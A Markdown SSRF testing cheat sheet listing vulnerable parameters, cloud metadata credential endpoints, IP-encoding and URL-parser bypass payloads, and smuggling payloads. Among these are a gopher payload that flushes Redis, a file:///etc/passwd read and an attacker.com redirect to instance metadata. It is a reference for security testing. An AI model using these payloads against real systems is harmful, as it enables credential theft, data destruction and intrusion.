# SSRF (Server-Side Request Forgery)

## Attack Surface Signals
- **URL-Fetching Features**: Webhook endpoints, link preview generators, PDF/document converters, image import/proxy, media transcoders, URL validators.
- **Parameter Names**: `url`, `target`, `dest`, `destination`, `feed`, `uri`, `webhook`, `callback`, `link`, `preview`, `source`, `host`, `domain`, `fetch`, `proxy`.
- **Response Headers**: `Server: Squid`, `Via: 1.1 proxy`, backend HTTP clients (e.g. `cURL/7.x`, `Apache-HttpClient`, `Python-urllib`, `Go-http-client`).

## Out-of-Band (OOB) Confirmation Gate
- Blind SSRF requires DNS/HTTP callback proof via interactsh/Burp Collaborator.
- Single callback attribution: Use unique subdomains per test parameter (`http://param-url.target.attacker.com`).

## Cloud Metadata & Internal Network Targets
- **AWS IMDSv1**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}`
- **AWS IMDSv2 Bypass (if header injection/proxy exists)**: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`
- **GCP Metadata**: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (requires `Metadata-Flavor: Google` or `/computeMetadata/v1/..;/?recursive=true`)
- **Azure IMDS**: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` (requires `Metadata: true`)
- **Kubernetes**: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets`, kubelet `http://127.0.0.1:10255/pods`
- **Internal Loopback Services**: Redis (`6379`), Elasticsearch (`9200`), Docker daemon (`2375`), Jenkins (`8080`), Consul (`8500`).

## Bypass Techniques & Encoding Payloads
- **IP Address Obfuscation**:
  - Dotted Hex: `http://0x7f.0x0.0x0.0x1` (127.0.0.1) or `http://0xa9.0xfe.0xa9.0xfe` (169.254.169.254)
  - Decimal: `http://2130706433` (127.0.0.1) or `http://2852039166` (169.254.169.254)
  - Octal: `http://0177.0.0.01`
  - IPv6 representations: `http://[::1]`, `http://[::ffff:127.0.0.1]`, `http://[0:0:0:0:0:ffff:a9fe:a9fe]`
  - Zero compression: `http://127.1` or `http://0/`
- **DNS Rebinding & Wildcard DNS**:
  - `http://169.254.169.254.nip.io`, `http://spoofed.burpcollaborator.net`
  - Rebinding server returning public IP on DNS check, `127.0.0.1` / `169.254.169.254` on fetch (TTL 0).
- **URL Parser Differentials**:
  - Userinfo confusion: `http://expected.com@169.254.169.254`
  - Fragment / Query confusion: `http://169.254.169.254#@expected.com`, `http://expected.com?@169.254.169.254`
  - Semicolon path normalization: `http://169.254.169.254/latest/meta-data;@expected.com`
- **Protocol Switching & Smuggling**:
  - Protocols: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`, `dict://`, `ldap://`, `file:///etc/passwd`
  - HTTP Redirect: Point parameter to `https://attacker.com/redirect` which issues `302 Found` to `http://169.254.169.254/`.

## Common Root Causes
- Validating destination hostname using regex before parsing, but underlying HTTP library parses URL differently (e.g. Python urllib vs Requests).
- Filtering applied before following HTTP 30x redirects.
- Inability to block local DNS resolution or private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).

## Exploit Chains
- **SSRF → Cloud IAM Role Credential Extraction → AWS S3 / KMS Full Takeover**.
- **SSRF (Gopher / HTTP) → Internal Redis / Docker Engine → Pre-Auth RCE**.
- **SSRF in Headless Chrome PDF Generator → Internal Microservice Token Exfiltration**.
